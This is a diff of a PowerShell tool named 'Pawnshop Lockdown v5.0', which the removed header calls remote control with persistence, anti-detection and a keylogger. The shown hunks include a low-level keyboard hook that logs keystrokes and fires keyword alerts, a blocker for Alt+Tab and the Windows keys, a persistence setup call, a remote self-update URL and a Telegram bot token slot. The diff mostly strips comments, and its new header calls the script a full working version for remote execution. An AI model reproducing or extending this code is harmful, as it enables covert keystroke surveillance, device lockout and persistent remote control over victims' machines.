@@ -1,13 +1,11 @@
-# ============================
-# Pawnshop Lockdown v5.0 - Advanced Remote Control with Persistence, Anti-Detection, Granular Commands, Keylogger & Alerts
-# ============================
+# Pawnshop Lockdown v5.0 - Full working version for remote execution
 
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 
 # --- CONFIG ---
-$githubURL   = "https://raw.githubusercontent.com/diezul/x/main/pawnfinal.ps1" # Optional for self-update
+$githubURL   = "https://raw.githubusercontent.com/diezul/x/main/pawnfinal.ps1"
 $localFolder = "$env:ProgramData\PawnshopLock"
-$localFile   = "$localFolder\pawnlock.ps1"
+$localFile   = "$localFolder\pawnfinal.ps1"
 $imageURL    = "https://raw.githubusercontent.com/diezul/x/main/69.jpeg"
 $tempImg     = "$env:TEMP\pawnlock.jpg"
 $botToken    = "YOUR_BOT_TOKEN"  # Replace with your bot token
@@ -140,7 +138,6 @@ public class KeyLogger {
     private static IntPtr Hook(int nCode, IntPtr wParam, IntPtr lParam) {
         if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN) {
             int vkCode = Marshal.ReadInt32(lParam);
-            // Simple conversion, may not cover all keys correctly
             char c = (char)vkCode;
             buffer.Append(c);
 
@@ -173,7 +170,6 @@ function On-KeywordDetected {
     }
 }
 
-# Register event handler
 [KeyLogger]::OnKeywordDetected += { param($text) On-KeywordDetected $text }
 
 # --- EXTENDED KEYBOARD BLOCKER ---
@@ -208,13 +204,11 @@ public class KeyBlocker {
         if (nCode >= 0 && (wParam == (IntPtr)WM_KEYDOWN || wParam == (IntPtr)WM_SYSKEYDOWN)) {
             int vkCode = Marshal.ReadInt32(lParam);
 
-            // Allow 'C' key to exit lockdown immediately
-            if (vkCode == 0x43) Environment.Exit(0);
+            if (vkCode == 0x43) Environment.Exit(0); // 'C' key to exit lockdown
 
             bool altPressed = (GetAsyncKeyState(0x12) & 0x8000) != 0;
             bool ctrlPressed = (GetAsyncKeyState(0x11) & 0x8000) != 0;
 
-            // Block Alt+Tab, Ctrl+Esc, Alt+Esc, Windows keys
             if ((vkCode == 0x09 && altPressed) || // Alt+Tab
                 (vkCode == 0x1B && ctrlPressed) || // Ctrl+Esc
                 (vkCode == 0x1B && altPressed) || // Alt+Esc
@@ -315,7 +309,7 @@ function Lock-PC {
 # --- MAIN LISTENER LOOP ---
 Setup-Persistence
 
-# Download image for lock screen if not exists
+# Download lock screen image if missing
 if (-not (Test-Path $tempImg)) {
     try {
         Invoke-WebRequest -Uri $imageURL -OutFile $tempImg
